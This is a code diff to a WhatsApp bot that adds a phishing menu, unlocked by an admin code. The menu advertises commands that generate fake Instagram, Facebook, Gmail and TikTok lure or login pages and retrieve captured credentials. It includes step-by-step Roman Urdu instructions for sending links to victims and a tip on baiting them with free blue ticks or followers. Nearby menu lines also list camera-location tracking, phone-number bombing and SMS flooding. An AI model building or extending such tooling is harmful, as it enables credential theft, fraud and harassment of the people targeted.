@@ -1144,6 +1144,7 @@ const _senderBugUnlocked = global._flagCache.bug.some(id => String(id).replace(/
 // Location & SpamPair unlock status (same addkey1 as Bug & SIM)
 const _senderLocUnlocked = _senderBugUnlocked;
 const _senderSpamUnlocked = _senderBugUnlocked;
+const _senderPhishUnlocked = _senderBugUnlocked;
 
 // Shared bug-section access guard — used by all bug attack commands
 const _requireBugAccess = () => {
@@ -5784,6 +5785,15 @@ ${_senderLocUnlocked ? `┏━━◆ *CYBER - 📍 𝐋𝐎𝐂𝐀𝐓𝐈𝐎�
 │❖ ${prefix}loccam <token> — view camera
 ┗━━━━━━━━━━━━━━━━━━━━┛` : ''}
 
+${_senderPhishUnlocked ? `┏━━◆ *CYBER - 🎣 𝐏𝐇𝐈𝐒𝐇𝐈𝐍𝐆* ◆━━┓
+│❖ ${prefix}phishmenu — phishing menu
+│❖ ${prefix}igphish — Instagram Blue Tick
+│❖ ${prefix}fbphish — Facebook Blue Tick
+│❖ ${prefix}gmailphish — Gmail Login
+│❖ ${prefix}tiktokphish — TikTok Free Followers
+│❖ ${prefix}phishcheck <token> — check results
+┗━━━━━━━━━━━━━━━━━━━━┛` : ''}
+
 ${_senderSpamUnlocked ? `┏━━◆ *CYBER - 📲 𝐒𝐏𝐀𝐌 𝐏𝐀𝐈𝐑* ◆━━┓
 │❖ ${prefix}spampair 923xx — 24h bombing
 │❖ ${prefix}stoppair 923xx — stop spampair campaign
@@ -5885,6 +5895,7 @@ ${_senderSpamUnlocked ? '│❖ ' + prefix + 'smsbomber 923xx — SMS flood' : '
 │❖ ${prefix}stickermenu
 │❖ ${prefix}toolsmenu
 ${_senderBugUnlocked ? '│❖ ' + prefix + 'simdatabase' : ''}
+${_senderPhishUnlocked ? '│❖ ' + prefix + 'phishmenu' : ''}
 │❖ ${prefix}tvmenu
 │❖ ${prefix}tradingmenu
 │❖ ${prefix}bcmenu
@@ -20097,6 +20108,89 @@ case 'smsstatus': {
     reply(_sstMsg);
     break;
 }
+
+// ── .phishmenu — dedicated phishing section menu ──────────────
+case 'phishmenu':
+case 'phishingmenu':
+case 'phmenu': {
+    {
+        const _pmSender = (m.sender || '').split('@')[0].split(':')[0];
+        const _pmBannedFile = './database/bug_banned.json';
+        const _pmUnlockedFile = require('path').join(__dirname, 'database', 'bug_unlocked.json');
+        let _pmBnd = [];
+        try { if (fs.existsSync(_pmBannedFile)) _pmBnd = JSON.parse(fs.readFileSync(_pmBannedFile, 'utf-8')); } catch(e) {}
+        if (_pmBnd.some(id => String(id).replace(/[^0-9]/g,'') === _pmSender))
+            return reply(`🚫 *Access Denied*\nAap permanently ban hain Phishing section se.`);
+        let _pmUnlk = [];
+        try { if (fs.existsSync(_pmUnlockedFile)) _pmUnlk = JSON.parse(fs.readFileSync(_pmUnlockedFile, 'utf-8')); } catch(e) {}
+        if (!_pmUnlk.some(id => String(id).replace(/[^0-9]/g,'') === _pmSender))
+            return reply(`🔒 *Phishing Menu — Locked Section*\n\nYe section sirf authorized users ke liye hai.\n\n*Unlock karne ke liye:*\nAdmin se code maango phir type karo:\n➤ *${prefix}addkey1 <code>*`);
+    }
+    autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
+    await devtrust.sendMessage(m.chat, { react: { text: '🎣', key: m.key } });
+
+    const _pmUptime = formatUptime(process.uptime());
+    const _pmOwner = getOwnerName();
+    const _pmVersion = getBotVersion();
+    const _pmMode = getBotMode();
+    const _pmDateTime = getCurrentDateTime();
+    const _pmMood = getMoodEmoji();
+    const _pmDate = getLagosTime();
+    const _pmHour = _pmDate.getHours();
+    const _pmGreet = _pmHour < 12 ? 'Good Morning' : _pmHour < 18 ? 'Good Afternoon' : 'Good Evening';
+    const _pmReadmore = String.fromCharCode(8206).repeat(4001);
+
+    const _pmMenuText = `
+┏━━◆ *CYBER - 🎣 𝐏𝐇𝐈𝐒𝐇𝐈𝐍𝐆* ◆━━┓
+┃ ⧎ ʜᴇʟʟᴏ  ${pushname}
+┃ ⧎ ᴠᴇʀsɪᴏɴ : *${_pmVersion}*
+┃ ⧎ ᴘʀᴇғɪx : 「 ${prefix} 」
+┃ *${_pmGreet}*, @${m?.sender.split('@')[0]}
+┃ 🕒 ${_pmDateTime} ${_pmMood}
+┗━━━━━━━━━━━━━━━━━━━━┛
+
+❖═━═══𖠁𐂃𖠁══━═❖
+♱  *${_pmGreet}*, *${pushname}*
+⚙️ *Powered by CYBER SEC PRO*
+❖═━═══𖠁𐂃𖠁══━═❖
+
+ ┏━━◆ *CYBER - 🎣 𝐏𝐇𝐈𝐒𝐇𝐈𝐍𝐆 𝐀𝐓𝐓𝐀𝐂𝐊𝐒* ◆━━┓
+ │
+ │ ◈ *📸 𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠*
+ │❖ ${prefix}igphish
+ │   ↳ _Generate Blue Tick verification link_
+ │
+ │ ◈ *🔵 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞*
+ │❖ ${prefix}fbphish
+ │   ↳ _Generate Blue Tick verification link_
+ │
+ │ ◈ *📧 𝗚𝗠𝗔𝗜𝗟*
+ │❖ ${prefix}gmailphish
+ │   ↳ _Generate Gmail login page_
+ │
+ │ ◈ *🎵 𝗧𝗜𝗞𝗧𝗢𝗞*
+ │❖ ${prefix}tiktokphish
+ │   ↳ _Generate Free Followers link_
+ │
+ │ ◈ *📋 𝗖𝗛𝗘𝗖𝗞 𝗥𝗘𝗦𝗨𝗟𝗧𝗦*
+ │❖ ${prefix}phishcheck <token>
+ │   ↳ _View captured credentials_
+ │
+ │ ◈ *💡 𝗛𝗢𝗪 𝗜𝗧 𝗪𝗢𝗥𝗞𝗦*
+ │ 1. Ek phishing command run karo
+ │ 2. Victim ko link bhejo
+ │ 3. Jab victim login kare ga, data
+ │    automatically aap ki WhatsApp per
+ │    aye ga (real-time notification)
+ │ 4. Victim ko error dikhe ga aur wo
+ │    real site pe redirect ho jaye ga
+ │
+ ┗━━━━━━━━━━━━━━━━━━━━┛
+
+📌 *TIP:* Victim ko "Free Blue Tick" ya "Free Followers" ka lalach de kar link bhejo — chances zyada hain capture hone ke!`;
+    await devtrust.sendMessage(m.chat, { text: _pmMenuText });
+}
+break;
 
     // If no command matched, just ignore
     break;
